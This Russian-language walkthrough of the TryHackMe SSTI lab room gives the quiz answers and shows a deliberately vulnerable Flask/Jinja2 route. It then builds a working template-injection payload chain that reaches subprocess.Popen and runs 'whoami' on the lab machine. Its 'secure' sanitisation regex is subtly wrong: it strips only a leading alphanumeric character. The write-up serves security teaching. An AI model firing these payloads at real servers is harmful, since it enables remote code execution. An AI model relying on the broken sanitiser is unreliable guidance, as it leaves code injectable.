[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [SSTI](https://tryhackme.com/r/room/learnssti) 

Всего 8 заданий:
## Задание 1
Что такое внедрение шаблона на стороне сервера?
Внедрение шаблона на стороне сервера (SSTI) — это веб-эксплойт, использующий небезопасную реализацию шаблонизатора.

#### Что такое шаблонизатор?
Шаблонизатор позволяет создавать статические файлы шаблонов, которые можно повторно использовать в вашем приложении.

Что это значит? Рассмотрим страницу, которая хранит информацию о пользователе, /profile/<user>. Код может выглядеть 
примерно так в Python Flask:
```commandline
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route("/profile/<user>")
def profile_page(user):
    template = f"<h1>Welcome to the profile of {user}!</h1>"

    return render_template_string(template)

app.run()
```

Этот код создает строку шаблона и объединяет в нее пользовательский ввод. Таким образом, содержимое может 
загружаться динамически для каждого пользователя, сохраняя при этом согласованный формат страницы.
Примечание: Flask — это веб-фреймворк, а Jinja2 — используемый шаблонизатор.

#### Как можно эксплуатировать SSTI?
Рассмотрим приведенный выше код, в частности строку шаблона. Переменная user (которая является пользовательским 
вводом) напрямую объединяется в шаблон, а не передается как данные. Это означает, что все, что предоставляется как 
пользовательский ввод, будет интерпретировано движком.

Примечание: Сами шаблонизаторы не уязвимы, а представляют собой небезопасную реализацию, сделанную разработчиком.

#### Каково влияние SSTI?
Как следует из названия, SSTI — это эксплойт на стороне сервера, а не на стороне клиента, как межсайтовый скриптинг 
(XSS).

Это означает, что уязвимости становятся еще более критичными, поскольку вместо того, чтобы взломать учетную запись 
на веб-сайте (обычное использование XSS ), вместо этого взламывается сервер.

Возможности безграничны, однако главной целью обычно является получение возможности удаленного выполнения кода.

Разверните! Разверните виртуальную машину, связанную с этой лабораторией, и следите за тем, как мы вместе 
эксплуатируем SSTI!

Вы можете получить доступ к веб-серверу, перейдя по адресу http://MACHINE_IP:5000

Примечание: конечная точка /не существует, и вы получите ошибку 404.

### Ответьте на вопросы ниже
Поймите все вышесказанное.
```commandline
Ответ не нужен
```

## Задание 2
Поиск точки инъекции Эксплойт должен быть где-то вставлен, это называется точкой инъекции.
В приложении есть несколько мест, которые мы можем посмотреть, например, URL-адрес или поле ввода (обязательно 
проверьте наличие скрытых входных данных).

В этом примере есть страница, на которой хранится информация о пользователе: `http://MACHINE_IP:5000/profile/<user>`, 
которая принимает данные, вводимые пользователем.

Мы можем найти предполагаемый вывод, указав ожидаемое имя:



#### Фаззинг
Фаззинг — это метод определения уязвимости сервера путем отправки нескольких символов в надежде на вмешательство в 
работу внутренней системы.

Это можно сделать вручную или с помощью приложения, например, BurpSuite's Intruder. Однако в образовательных целях 
мы рассмотрим ручной процесс.

К счастью для нас, большинство шаблонизаторов используют похожий набор символов для своих «специальных функций», что 
позволяет относительно быстро определить, уязвим ли он для SSTI.

Например, известно, что следующие символы используются во многих шаблонизаторах: `${{<%[%'"}}%`.

Чтобы вручную размыть все эти символы, их можно отправлять по одному, один за другим.

Процесс фаззинга выглядит следующим образом:

Продолжайте этот процесс до тех пор, пока не возникнет ошибка или некоторые символы не начнут исчезать из вывода.

### Ответьте на вопросы ниже
Какая последовательность символов приводит к возникновению ошибки в приложении?
```commandline
{{
```

## Задание 3
Теперь, когда мы определили, какие символы вызвали ошибку приложения, пришло время определить, какой шаблонизатор используется.

В лучшем случае сообщение об ошибке будет включать шаблонизатор, что означает завершение этого шага!

Однако если это не так, мы можем использовать дерево решений, которое поможет нам определить шаблонизатор:

Фото предоставлено: PortSwigger

Чтобы следовать дереву решений, начните с самого левого края и включите переменную в свой запрос. Следуйте стрелке в 
зависимости от выходных данных:

- Зеленая стрелка — выражение оценено (т.е. 42 )
- Красная стрелка — выражение отображается в выводе (т.е. ${7*7} )
В случае нашего примера процесс выглядит следующим образом:

Приложение копирует пользовательский ввод, поэтому следуем красной стрелке:

Приложение оценивает пользовательский ввод, поэтому следуем зеленой стрелке.

Продолжайте этот процесс, пока не дойдете до конца дерева решений.

### Ответьте на вопросы ниже
Какой шаблонизатор используется в этом приложении?
```commandline
Jinja2
```

## Задание 4
После определения шаблонизатора нам теперь нужно изучить его синтаксис.

Где лучше всего изучать официальную документацию ?

Всегда обращайте внимание на следующее, независимо от языка или шаблонизатора:

Как начать печатную выписку
Как закончить печатное заявление
Как начать блок-заявление
Как закончить блок-оператор
В случае нашего примера в документации указано следующее:

- {{- Используется для обозначения начала печатного оператора.
- }}- Используется для обозначения конца печатного оператора.
- {%- Используется для обозначения начала блока операторов.
- %}- Используется для обозначения конца блока операторов.
### Ответьте на вопросы ниже
Как начать комментарий в Jinja2?
```commandline
{#
```

## Задание 5
На данный момент мы знаем:

Приложение уязвимо к SSTI
Точка впрыска
Шаблонизатор
Синтаксис шаблонизатора
Планирование
Давайте сначала спланируем, как мы хотели бы воспользоваться этой уязвимостью.

Поскольку Jinja2 — это шаблонизатор на основе Python, мы рассмотрим способы запуска команд оболочки в Python. 
Быстрый поиск в Google выводит блог , в котором подробно описаны различные способы запуска команд оболочки. Я выделю 
несколько из них ниже:
```commandline
# Method 1
import os
os.system("whoami")

# Method 2
import os
os.popen("whoami").read()

# Method 3
import subprocess
subprocess.Popen("whoami", shell=True, stdout=-1).communicate()
```

Создание доказательства концепции (Generic)
Объединив все эти знания, мы можем создать доказательство концепции (POC).

Следующая полезная нагрузка берет синтаксис, который мы получили из Задачи 4, и оболочки, указанные выше, и 
объединяет их в нечто, что примет шаблонизатор: `http://MACHINE_IP:5000/profile/{% import os %}{{ os.system("whoami") }}`.

Примечание: Jinja2 по сути является подъязыком Python, который не интегрирует оператор импорта , поэтому приведенный 
выше код не работает.

Создание доказательства концепции (Jinja2)

Python позволяет нам вызывать текущий экземпляр класса с помощью .__class__ , мы можем вызвать его для пустой строки:

Полезная нагрузка: `http://MACHINE_IP:5000/profile/{{ ''.__class__ }}`.

Классы в Python имеют атрибут .__mro__ , который позволяет нам подниматься по унаследованному дереву объектов:

Полезная нагрузка: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__ }}`.

Поскольку нам нужен корневой объект, мы можем получить доступ ко второму свойству (первый индекс):

Полезная нагрузка: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1] }}`.

Объекты в Python имеют метод .__subclassess__ , который позволяет нам спускаться по дереву объектов:

Полезная нагрузка: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}`.

Теперь нам нужно найти объект, который позволяет нам запускать команды оболочки. Выполнение Ctrl-F для модулей в 
коде выше дает нам совпадение:



Поскольку весь этот вывод — это просто список Python, мы можем получить к нему доступ, используя его индекс. Вы 
можете найти его либо методом проб и ошибок, либо подсчитав его позицию в списке.

В этом примере позиция в списке — 400 (индекс 401):

Полезная нагрузка: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}`.

Приведенная выше полезная нагрузка по сути вызывает метод subprocess.Popen , теперь все, что нам нужно сделать, это вызвать его (используйте код выше для синтаксиса)

Полезная нагрузка: `http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}`.

Поиск полезных нагрузок
Процесс создания полезной нагрузки может занять некоторое время, если вы делаете это впервые, однако важно понимать, 
почему это работает.

Для быстрой справки был создан замечательный репозиторий GitHub в качестве шпаргалки по полезным нагрузкам для всех 
веб-уязвимостей, включая SSTI.

Репозиторий находится здесь, а документ для SSTI находится здесь .

### Ответьте на вопросы ниже
Каков результат выполнения команды оболочки «whoami»?
```commandline
jake
```
## Задание 6
Теперь, когда мы взломали приложение, давайте посмотрим, что на самом деле происходило при внедрении полезной нагрузки.

Код, который мы использовали, был таким же, как показано в Задании 1:
```commandline
from flask import Flask, render_template_string
app = Flask(__name__)

@app.route("/profile/<user>")
def profile_page(user):
    template = f"<h1>Welcome to the profile of {user}!</h1>"

    return render_template_string(template)

app.run()
```
Давайте представим это как простую операцию поиска и замены.

Чтобы увидеть, как именно это работает, обратитесь к коду ниже:
```commandline
# Raw code
template = f"<h1>Welcome to the profile of {user}!</h1>"

# Code after injecting: TryHackMe
template = f"<h1>Welcome to the profile of TryHackMe!</h1>"

# Code after injecting: {{ 7 * 7 }}
template = f"<h2>Welcome to the profile of {{ 7 * 7 }}!</h1>"
```
Как мы узнали в Задании 4, Jinja2 будет оценивать код, который находится между этими наборами символов, поэтому 
эксплойт и сработал.

### Ответьте на вопросы ниже
Поймите все вышесказанное.
```commandline
Ответ не нужен
```

## Задание 7
Все эти хакерские атаки поднимают вопрос: что можно сделать, чтобы предотвратить подобные инциденты?

Безопасные методы.
Большинство шаблонизаторов имеют функцию, которая позволяет передавать входные данные в виде данных, а не объединять входные данные в шаблон.

В Jinja2 это можно сделать с помощью второго аргумента:
```commandline
# Insecure: Concatenating input
template = f"<h1>Welcome to the profile of {user}!</h1>"
return render_template_string(template)

# Secure: Passing input as data
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)
```
Санитарная обработка
Вводимым пользователем данным нельзя доверять!

В каждом месте вашего приложения, где пользователю разрешено добавлять пользовательский контент, убедитесь, что 
вводимые данные проходят очистку!

Это можно сделать, сначала решив, какой набор символов вы хотите разрешить, и добавив его в белый список.

В Python это можно сделать так:
```commandline
import re

# Remove everything that isn't alphanumeric
user = re.sub("^[A-Za-z0-9]", "", user)
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)
```
Самое главное, не забудьте прочитать документацию по используемому вами шаблонизатору.
### Ответьте на вопросы ниже
Поймите все вышесказанное.
```commandline
Ответ не нужен
```

## Задание 8
Программа HackerOne Bug Bounty
В марте 2016 года пользователь сообщил об уязвимости SSTI в одном из поддоменов Uber.

Уязвимость присутствовала в форме, которая позволяла пользователю менять имя своего профиля. Как и в примере, 
пользователь имел контроль над вводом, который затем был отражен обратно пользователю (по электронной почте).

Хотя пользователь не смог получить возможность удаленного выполнения кода, уязвимость все еще присутствовала, и ему 
было выдано вознаграждение в размере 10 000 долларов!

Прочитать отчет можно здесь.

### Ответьте на вопросы ниже
Какая полезная нагрузка использовалась для подтверждения SSTI?
```commandline
{{ '7'*7 }}
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)